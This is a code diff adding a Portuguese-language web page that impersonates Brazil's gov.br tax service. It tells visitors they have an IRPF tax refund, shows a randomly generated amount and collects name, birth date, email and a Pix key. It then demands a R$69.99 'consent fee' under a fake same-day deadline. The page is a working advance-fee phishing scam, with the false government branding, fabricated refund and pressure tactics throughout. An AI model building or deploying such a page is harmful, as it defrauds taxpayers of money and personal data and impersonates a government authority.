@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Input</title>
+    <style>
+        .top-bar img {
+            height: 30px;
+        }
+        .icon-lupa {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 30px;
+            height: 30px;
+            cursor: pointer;
+        }
+        .info-table {
+            width: 100%;
+            margin: 20px 0;
+            border-collapse: collapse;
+            text-align: center;
+        }
+        .info-table th, .info-table td {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: center;
+        }
+        .total {
+            color: green;
+        }
+        .taxa {
+            color: red;
+        }
+        .center-box {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 700px;
+            margin: 150px auto 80px;
+            text-align: left;
+        }
+        .form-group {
+            margin-bottom: 10px;
+        }
+        input, button, textarea {
+            padding: 8px;
+            font-size: 14px;
+            margin: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: background-color 0.3s;
+        }
+        button:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+        }
+        button img {
+            width: 14px;
+            height: 14px;
+        }
+        .loading {
+            display: none;
+            margin-top: 10px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            padding: 50px;
+            background-color: #002776;
+            color: #fff;
+            text-align: center;
+        }
+        .texto-atenção {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/11/Gov.br_logo.svg" alt="Bandeira do Brasil">
+        <img class="icon-lupa" src="https://cdn-icons-png.flaticon.com/512/10629/10629681.png" alt="Lupa">
+    </div>
+    <div class="center-box">
+        <h1>Relatório IRPF, Protocolo De Saque</h1>
+        <p>*Contribuinte, informamos que seu CPF tem um saldo positivo no IRPF, segundo á Lei n°7.713 de 1988 seus impostos
+             cobrados indevidamente serão devidamente devolvidos. </p>
+             <p>Segue seu relatório IRPF:</p>
+        <table class="info-table">
+            <tr>
+                <th>Total</th>
+                <th>Taxa</th>
+            </tr>
+            <tr>
+                <td id="total" class="total">R$ 0,00</td>
+                <td id="taxa" class="taxa">R$ 0,00</td>
+            </tr>
+        </table>
+        <form id="emailForm">
+            <p> Para fazer o saque do seu IRPF preencha ás informações abaixo e 
+                em seguida pague a taxa de anuência.</p>
+            <div class="form-group">
+                <label for="nomeCompleto">Nome Completo:</label>
+                <input type="text" id="nomeCompleto" placeholder="Ex: João Silva" required>
+            </div>
+            <div class="form-group">
+                <label for="dataNascimento">Data de Nascimento:</label>
+                <input type="date" id="dataNascimento" required>
+            </div>
+            <div class="form-group">
+                <label for="emailInput">E-mail Para Contato:</label>
+                <input type="email" id="emailInput" placeholder="Ex: exemplo@dominio.com" required>
+            </div>
+            <div class="form-group">
+                <label for="chaveInput">Chave Pix Para Recebimento do IRPF:</label>
+                <input type="text" id="chaveInput" placeholder="Digite a chave" required>
+            </div>
+            <h4>Copie o código abaixo e realize o pagamento da taxa de anuência:</h4>
+            <div class="form-group">
+                <textarea id="codigoAutoria" rows="5" cols="50" readonly>
+Seu código personalizado será exibido aqui!
+                </textarea>
+                <button type="button" id="copiarCodigoBtn">Copiar Código</button>
+            </div>
+            <p><strong class="texto-atenção">Atenção:</strong> O saque funcionará somente até ás <span id="horaFinal"></span> de hoje. Após esse tempo, as funcionalidades serão desativadas.</p>
+            <button type="button" id="consultarBtn" disabled>
+                <img src="https://icons.iconarchive.com/icons/icons8/ios7/256/Very-Basic-Search-icon.png" alt="Lupa">
+                Enviar
+            </button>
+        </form>
+        <p id="resultado" aria-live="polite"></p>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Verificando...</p>
+        </div>
+    </div>
+    <script>
+        function formatarValor(valor) {
+            return valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        }
+        function gerarTotal() {
+            return Math.floor(Math.random() * (3000 - 1000 + 1)) + 1000;
+        }
+        function gerarTaxa() {
+            return 69.99;
+        }
+        function atualizarTabela() {
+            const total = gerarTotal();
+            const taxa = gerarTaxa();
+            document.getElementById('total').textContent = formatarValor(total);
+            document.getElementById('taxa').textContent = formatarValor(taxa);
+        }
+        atualizarTabela();
+        function isEmailValid(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        function displayMessage(message, color) {
+            const resultado = document.getElementById('resultado');
+            resultado.textContent = message;
+            resultado.style.color = color;
+        }
+        function showLoading(timeout) {
+            const loading = document.getElementById('loading');
+            loading.style.display = 'block';
+            setTimeout(() => {
+                loading.style.display = 'none';
+                window.location.href = 'index.html';
+            }, timeout);
+        }
+        function validarEmail() {
+            const emailInput = document.getElementById('emailInput').value.trim();
+            displayMessage("Verificando a validade do e-mail...", 'blue');
+
+            if (isEmailValid(emailInput)) {
+                displayMessage("E-mail válido!", 'green');
+                showLoading(30000);
+            } else {
+                displayMessage("E-mail inválido.", 'red');
+            }
+        }
+        function verificarCampos() {
+            const nomeCompleto = document.getElementById('nomeCompleto').value.trim();
+            const dataNascimento = document.getElementById('dataNascimento').value.trim();
+            const emailInput = document.getElementById('emailInput').value.trim();
+            const chaveInput = document.getElementById('chaveInput').value.trim();
+            const botaoConsultar = document.getElementById('consultarBtn');
+            botaoConsultar.disabled = !(nomeCompleto && dataNascimento && emailInput && chaveInput);
+        }
+        document.getElementById('nomeCompleto').addEventListener('input', verificarCampos);
+        document.getElementById('dataNascimento').addEventListener('input', verificarCampos);
+        document.getElementById('emailInput').addEventListener('input', verificarCampos);
+        document.getElementById('chaveInput').addEventListener('input', verificarCampos);
+        document.getElementById('consultarBtn').addEventListener('click', validarEmail);
+        document.getElementById('copiarCodigoBtn').addEventListener('click', () => {
+            const codigoAutoria = document.getElementById('codigoAutoria');
+            codigoAutoria.select();
+            codigoAutoria.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(codigoAutoria.value)
+                .then(() => alert('Código copiado para a área de transferência!'))
+                .catch(() => alert('Erro ao copiar o código.'));
+        });
+        function calcularHoraFinal() {
+            const agora = new Date();
+            const horaFinal = new Date(agora.getTime() + 4 * 60 * 33 * 1000);
+            const horas = horaFinal.getHours().toString().padStart(2, '0');
+            const minutos = horaFinal.getMinutes().toString().padStart(2, '0');
+            const horaFinalFormatada = `${horas}:${minutos}`;
+            document.getElementById('horaFinal').textContent = horaFinalFormatada;
+        }
+        calcularHoraFinal();
+        verificarCampos();
+    </script>
+</body>
+</html>
